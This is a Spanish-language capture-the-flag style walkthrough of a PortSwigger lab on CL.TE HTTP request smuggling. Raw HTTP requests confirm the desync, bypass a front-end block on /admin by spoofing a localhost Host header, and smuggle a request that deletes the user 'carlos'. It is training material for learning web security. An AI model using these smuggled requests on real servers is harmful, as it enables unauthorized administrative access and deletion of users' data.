	
### La descripción del laboratorio
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.
### Primero
Confirmo si es un CL.TE.
```
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
La respuesta da un time out, por lo que ya se que el frot-end prioriza el content-length por sobre el Transfer-Encoding.
### Acceder al panel /admin
Es CL.TE, por lo que ni siquiero le doy a la opcion de "Update Content-length" ya que quiero que el frontend me toda la request al back-end. 
La request:
```
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net

```
El servidor responde con que solo esta permitido usuario locales, por lo que 
```
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```
Luego envío otra solicitud get en la misma ruta,
Lo cual me da un 400:
"error":"Duplicate header names are not allowed"
Esto es porque tenemos la solicitud que vemos arriba (tecnicamente son dos, pero el frontend ve una) , y la segunda request, la cual es una normal que bien podría ser un navegante en la web:
```
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```
, entonces lo que el backend ve es esto:
```HTTP
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.netPOST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Osea que hay dos header iguales.
Para solucionar esto, se puede incluir la request dentro del body, utilizando una X=
```HTTP
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=\n
```
Por lo que la siguiente request se va a concatenar a la otra, entonces envíamos la request envenenada, la quequest normal
```normal
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Y esto nos responde con el screen de admin, donde hay links que borran usuarios, así que lo usamos como path:
```
POST / HTTP/1.1
Host: 0ad400e903a9e00a811dde740096000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```